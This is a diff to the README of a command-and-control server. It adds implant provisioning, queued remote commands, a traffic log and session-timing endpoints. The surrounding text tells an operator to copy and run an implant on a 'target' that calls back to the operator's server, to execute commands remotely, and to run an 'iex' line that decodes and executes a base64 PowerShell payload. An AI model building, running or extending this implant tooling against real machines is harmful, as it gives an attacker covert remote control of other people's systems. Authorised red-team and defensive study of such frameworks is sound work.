@@ -28,11 +28,14 @@ Session history is persisted to `c2_sessions.jsonl` in the server directory (app
 
 Example:
 
+- **session_ttl_sec** – If set (e.g. `120`), sessions are closed after this many seconds with no activity. `0` = no expiry (default).
+
 ```json
 {
   "port": 8443,
   "sync_token": "your-secret-sync-key",
-  "op_token": "your-operator-key"
+  "op_token": "your-operator-key",
+  "session_ttl_sec": 0
 }
 ```
 
@@ -66,6 +69,8 @@ iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))
 Copy the built `client` binary and `server.crt` (and optionally `config.json`) to the target. Create `config.json` with `server_url: wss://YOUR_SERVER:8443/live`, `client_id`, and `client_secret` matching the server. Run `./client`. If the target has Go installed, you can instead build there: clone the repo, `cd client && go build -o client .`, then run with the same config.
 
 When the implant connects, the server logs: `session xxxxxxxx connected`.
+
+**Provisioned devices (optional):** Use **POST /op/provision** with body `{"alias": "cable1"}` (and op token). The server returns `client_id`, `client_secret`, and a provision string. Put those in your implant config (e.g. Go client `config.json`). When that implant connects, the session is tagged with the alias and shown in the UI. This allows multiple pre-registered “devices” (e.g. O.MG-style) without sharing the main server client_id/secret.
 
 ## 4. Operator: list, use, exec (stdin)
 
@@ -115,6 +120,12 @@ curl -k -X POST https://localhost:8443/op/exec \
 Response: `{"session_id":"a1b2c3d4","command_id":"...","status":"success","output":"desktop-abc\\user","error":""}`
 
 The request blocks until the client responds or 90s timeout.
+
+**Command queue (O.MG-style):** **POST /op/queue** with `{"session_id":"...","command":"..."}` adds a command to the session’s queue. The server sends the next queued command automatically when the implant sends a response. **GET /op/queue?session_id=...** lists the queue; **POST /op/queue/clear** with `{"session_id":"..."}` clears it.
+
+**C2 traffic log:** **GET /op/c2log?session_id=&limit=200** returns a JSON array of `{ts, session_id, direction, detail}` (commands sent and responses). Optional `abridge=true` omits "out" rows. Log is appended to `c2_traffic.jsonl` in the server directory.
+
+**Session config:** **GET /op/session_config?session_id=...** and **POST /op/session_config** with `{"session_id":"...","poll_seconds":60,"fast_seconds":5}` set per-session poll/timing hints (for display or future use).
 
 ## 6. View page
 
